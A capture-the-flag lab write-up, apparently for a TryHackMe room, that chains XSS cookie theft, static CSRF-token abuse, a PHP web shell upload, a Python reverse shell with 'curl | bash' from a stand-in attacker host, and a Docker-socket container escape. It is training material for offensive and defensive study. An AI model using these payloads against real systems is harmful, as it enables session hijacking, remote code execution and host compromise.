# Sequence Room Writeup – Step-by-Step Journey

This writeup mirrors exactly what was done, showing each command, page interaction, and how the tester progressed from a visitor to root. Follow along to see how each flag was obtained.

---

## Table of Contents

1. [Setup & Initial Recon](#setup--initial-recon)
2. [Phase 1 – XSS to Moderator](#phase-1--xss-to-moderator)
3. [Phase 2 – Moderator to Admin via CSRF](#phase-2--moderator-to-admin-via-csrf)
4. [Phase 3 – Access Finance Panel](#phase-3--access-finance-panel)
5. [Phase 4 – File Upload & Shell](#phase-4--file-upload--shell)
6. [Phase 5 – Container Escape & Root Flag](#phase-5--container-escape--root-flag)
7. [Interactive Recap](#interactive-recap)

---

## 1. Setup & Initial Recon

You began by pointing your attack machine at the target:

```bash
echo "10.10.195.11 review.thm" | sudo tee -a /etc/hosts
```

Then you launched your HTTP server to host payloads:

```bash
cd ~/www
python3 -m http.server 80
```

You scanned all ports and services:

```bash
nmap -T4 -n -sC -sV -Pn -p- review.thm
```

Observed services:

```
22/tcp: SSH (OpenSSH 8.2p1)
80/tcp: HTTP (Apache 2.4.41)
```

Next, you fuzzed for hidden endpoints:

```bash
ffuf -u 'http://review.thm/FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -e .php -mc all -t 100 -fc 404 -ic
```

You discovered `/mail/`, `/login.php`, and `/contact.php`.

Visiting `http://review.thm/mail/dump.txt` revealed:

```
Finance panel: /finance.php (internal 192.x network)
Lottery panel: /lottery.php
Password: S60u}f5j
```

---

## 2. Phase 1 – XSS to Moderator

### 2.1 Craft & Host XSS Payload

Create `test.js` on your HTTP server:

```bash
cat > ~/www/test.js << 'EOF'
fetch("http://YOUR_IP/?c=" + document.cookie)
EOF
```

### 2.2 Inject Payload in Contact Form

At `http://review.thm/contact.php`, submit the contact form with the following values:

- **Name:** attacker
- **Email:** a@a.com
- **Message:**

```html
<script src="http://YOUR_IP/test.js"></script>
```

### 2.3 Capture & Use Moderator Session

Your HTTP server logs will show the moderator's cookie being exfiltrated, for example:

```
GET /?c=PHPSESSID=k73b004qihakut11s5lv4s32lc HTTP/1.1
```

Open your browser dev tools, replace your `PHPSESSID` cookie with this value, and refresh the site. You should land on the moderator view showing:

```
Flag#1: THM{xxxxxxxxxxxxxxxx}
```

and additional moderator-only menu items (e.g., Admin View, Settings, Chat).

---

## 3. Phase 2 – Moderator to Admin via CSRF

### 3.1 Inspect CSRF Token

On `http://review.thm/settings.php`, viewing the source showed a hidden promotion token:

```html
<input type="hidden" name="csrf_token_promote" value="ad148a3ca8bd0ef3b48c52454c493ec5">
```

### 3.2 Decode Token Pattern

Locally, you tested MD5 values:

```bash
echo -n 'mod' | md5sum
# ad148a3ca8bd0ef3b48c52454c493ec5

echo -n 'admin' | md5sum
# 21232f297a57a5a743894a0e4a801fc3
```

### 3.3 Send CSRF Promotion Link

From the moderator Chat (`/chat.php`) you sent a link that would promote a user using the admin MD5 token:

```
http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
```

### 3.4 Re-login as Mod

You changed your password on the Settings page, logged out, then logged back in as `mod` using the new password. Your role escalated to **admin** and you saw:

```
Flag#2: THM{yyyyyyyyyyyyyyyy}
```

alongside admin menu options.

---

## 4. Phase 3 – Access Finance Panel

### 4.1 Intercept Dashboard Request

At `http://review.thm/dashboard.php`, you used your proxy/interceptor and clicked the Lottery feature. You modified the intercepted POST request:

```
feature=lottery.php  →  feature=finance.php
```

### 4.2 Authenticate

When prompted for the finance panel password, enter:

```
S60u}f5j
```

This loads the internal finance panel which exposes a file upload form.

---

## 5. Phase 4 – File Upload & Shell

### 5.1 Create & Upload Web Shell

Locally craft a minimal PHP web shell:

```bash
cat > shell.php << 'EOF'
<?php system($_GET["cmd"]); ?>
EOF
```

Upload `shell.php` via the finance panel's file upload.

### 5.2 Test Command Execution

Visit the uploaded shell in your browser:

```
http://review.thm/uploads/shell.php?cmd=id
```

Expected output (in this case inside the container):

```
uid=0(root) gid=0(root) groups=0(root)
```

This confirms command execution as **root** inside the Docker container.

---

## 6. Phase 5 – Container Escape & Root Flag

### 6.1 Launch Reverse Shell

Place the following on your web server (e.g., `~/www/index.html`) or run it from the shell to pull a reverse shell from the target:

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("YOUR_IP",443));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty;pty.spawn("sh")'
```

Start a listener on your machine:

```bash
nc -lvnp 443
```

Trigger the reverse shell via the web shell:

```
http://review.thm/uploads/shell.php?cmd=curl%20YOUR_IP%20|%20bash
```

Your listener should receive a shell as root inside the container.

### 6.2 Escape via Docker Socket

Inside the container, confirm the presence of the Docker socket:

```bash
ls -la /var/run/docker.sock
```

Run a privileged container with the host filesystem mounted:

```bash
docker run -v /:/mnt --rm -it php:8.1-cli bash
```

### 6.3 Retrieve Host’s Root Flag

Within the new container, list and read the flag:

```bash
ls -l /mnt/root/
cat /mnt/root/flag.txt
```

Output:

```
Flag#3: THM{zzzzzzzzzzzzzzzzzz}
```

---

## Interactive Recap

- **Flag 1 (mod access):** `THM{xxxxxxxxxxxxxxxx}`
- **Flag 2 (admin access):** `THM{yyyyyyyyyyyyyyyy}`
- **Flag 3 (root access):** `THM{zzzzzzzzzzzzzzzzzz}`

Each phase built upon the last: exploiting **XSS** → hijacking a session, abusing static **CSRF** tokens → privilege escalation, leveraging insecure **file uploads** → code execution, and finally using a mounted **Docker socket** → container escape. This chain demonstrates the power of vulnerability chaining — don’t let medium or low issues slip through your defenses!

---

*Notes & safe-practice reminders:*

- Do **not** run arbitrary shells or payloads against systems you do not own or have explicit permission to test.
- Treat password and token values shown here as **examples** — real engagements will differ.
- Use secure coding practices, rotate CSRF tokens, and avoid mounting the Docker socket into untrusted containers.

<!-- End of writeup -->
